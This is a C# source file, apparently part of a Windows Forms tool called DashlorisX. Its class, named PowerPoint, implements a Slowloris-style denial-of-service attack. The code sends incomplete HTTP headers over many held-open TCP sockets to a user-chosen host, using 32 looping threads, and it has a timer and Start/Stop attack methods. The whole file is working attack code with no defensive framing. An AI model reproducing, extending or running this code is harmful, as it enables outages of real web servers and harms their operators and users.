// Author: Dashie
// Version: 1.0
//
// <description>
//

using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Text;
using System.Drawing;
using System.Threading;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Collections.Generic;

using DashlorisX.Properties;

namespace DashlorisX
{ 
    public class PowerPoint
    {
	readonly List<Thread> workers = new List<Thread>();

	readonly AttackLog LogLog = new AttackLog();
	readonly DashNet DashNet = new DashNet();

	private string GetHeader()
	{
	    var version = Settings.HTTPvBox.Text;
	    var method = Settings.MethodBox.Text;

	    var host = DashlorisX.HostTextBox.Text;

	    if (host.Contains("http://") || host.Contains("https://"))
	    {
		host = host.ToLower().Replace("http://", "").Replace("https://", "");
	    }

	    var useragent = Settings.UserAgentBox.Text;
	    var cookie = Settings.CookieBox.Text;

	    var bytes = DashlorisX.BytesTextBox.Text;

	    string Optionals()
	    {
		if (method == "POST")
		{
		    return string.Format
		    (
			"Accept-Encoding: gzip, deflate\r\n" +
			"Upgrade-Insecure-Requests: 1\r\n"
		    );
		}

		return string.Empty;
	    }

	    return string.Format(
		$"@1 / @2\r\n".Replace("@1", method).Replace("@2", version) +
		$"Host: @\r\n".Replace("@", host) +
		$"Content-Length: @\r\n".Replace("@", bytes) +
		$"User-Agent: @\r\n".Replace("@", useragent) +
		$"{Optionals()}\r\n" +
		$"Cookie: @\r\n\r\n".Replace("@", cookie.Replace(" ", ""))
	    );
	}

	readonly List<Socket> longSocks = new List<Socket>();

	private void SendHeader(Socket longSock)
	{   
	    var host = DashNet.GetIP(DashlorisX.HostTextBox.Text);
	    var port = DashNet.GetPort(DashlorisX.PortTextBox.Text);

	    try//Multi thread this
	    {
		var result = longSock.BeginConnect(host, port, null, null);
		var success = result.AsyncWaitHandle.WaitOne(500, true);

		longSock.Ttl = 255;

		longSocks.Add(longSock);

		if (longSock.Connected)
		{
		    byte[] header = Encoding.ASCII.GetBytes(GetHeader());
		    
		    longSock.Send(header);
		}
	    }

	    catch
	    {
		return;
	    }
	}

	System.Timers.Timer timer = null;

	private void StartTimer()
	{
	    var duration = DashNet.GetInteger(DashlorisX.DurationTextBox.Text) * 1000;

	    timer = new System.Timers.Timer(duration);

	    timer.Elapsed += (s, e) =>
	    {
		StopAttack();
	    };

	    timer.AutoReset = false;
	    timer.Start();
	}

	private Socket GetSocket() =>
	    new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

	public void StartAttack()
	{
	    for (int k = 0; k < 32; k += 1)//worker integration
	    {
		workers.Add(new Thread(() =>
		{
		    while (true)
		    {
			for (int request = 0; request < 64; request += 1)
			{
			    for (int multiplier = 0; multiplier < 4; multiplier += 1)
			    {
				SendHeader(GetSocket());
			    }

			    Thread.Sleep(1000);
			}

			Thread.Sleep(8000);
		    }
		}));

		workers[workers.Count - 1].IsBackground = true;
		workers[workers.Count - 1].Start();
	    }

	    StartTimer();
	    
	    LogLog.ShowDialog();
	}

	public void StopAttack()
	{
	    DashlorisX.Launch.Text = "Stopping ....";
	    
	    try//10.0.2.15
	    {
		foreach (Socket longSock in longSocks)
		{
		    longSock.Close();
		    longSock.Dispose();
		}

		longSocks.Clear();

		timer.Stop();
		timer = null;

		foreach (Thread worker in workers)
		{
		    worker.Abort();
		}

		workers.Clear();
	    }

	    catch
	    {
		//
	    }

	    DashlorisX.Launch.Text = "Launch";
	}
    }
}
